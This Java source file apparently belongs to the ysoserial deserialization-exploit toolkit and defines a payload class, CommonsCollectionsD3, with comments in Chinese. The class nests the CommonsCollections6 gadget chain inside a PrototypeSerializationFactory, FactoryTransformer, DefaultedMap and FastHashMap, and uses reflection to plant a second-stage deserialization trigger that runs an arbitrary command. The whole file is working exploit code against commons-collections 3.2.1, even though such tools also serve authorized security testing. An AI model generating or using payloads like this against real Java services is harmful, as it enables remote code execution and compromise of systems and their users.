package ysoserial.payloads;

import org.apache.commons.collections.Factory;
import org.apache.commons.collections.FastHashMap;
import org.apache.commons.collections.functors.FactoryTransformer;
import org.apache.commons.collections.map.DefaultedMap;
import ysoserial.payloads.annotation.Authors;
import ysoserial.payloads.annotation.Dependencies;
import ysoserial.payloads.util.PayloadRunner;
import ysoserial.payloads.util.Reflections;

import java.io.Serializable;
import java.lang.reflect.Constructor;
import java.lang.reflect.Field;
import java.util.HashMap;

@SuppressWarnings({"rawtypes", "unchecked"})
@Dependencies({"commons-collections:commons-collections:3.2.1"})
@Authors({Authors.DIGGID})
public class CommonsCollectionsD3 extends PayloadRunner implements ObjectPayload<HashMap> {

    // Todo:二次反序列化，在其他序列化方式中还是有一定价值的
    public HashMap getObject(final String command) throws Exception {

        Object object = new CommonsCollections6().getObject(command);

        Class<?> factoryCls = Class.forName("org.apache.commons.collections.functors.PrototypeFactory$PrototypeSerializationFactory");
        Constructor<?> cons = factoryCls.getDeclaredConstructor(Serializable.class);
        cons.setAccessible(true);
        Factory factory = (Factory) cons.newInstance(object);
        FactoryTransformer transformer = new FactoryTransformer(factory);

        HashMap tmp = new HashMap();

        tmp.put("zZ", "diggid");
        DefaultedMap map  = (DefaultedMap) DefaultedMap.decorate(tmp, transformer);
        FastHashMap fasthm = new FastHashMap();
        fasthm.put("yy", "diggid");
        HashMap obj = new HashMap();
        obj.put("b", "b");
        obj.put(fasthm, "1");

        Object[] table = (Object[]) Reflections.getFieldValue(obj, "table");
        // hashmap的索引会根据key的值而变化，如果要改前面的key的话，这里的索引可以用调试的方式改一下
        Object node = table[2];
        Field keyField;
        try{
            keyField = node.getClass().getDeclaredField("key");
        }catch(Exception e){
            keyField = Class.forName("java.util.MapEntry").getDeclaredField("key");
        }
        Reflections.setAccessible(keyField);
        if (keyField.get(node) instanceof String){
            keyField.set(node, map);
        }
        return obj;
    }

    public static void main(final String[] args) throws Exception {
        PayloadRunner.run(CommonsCollectionsD3.class, args);
    }
}
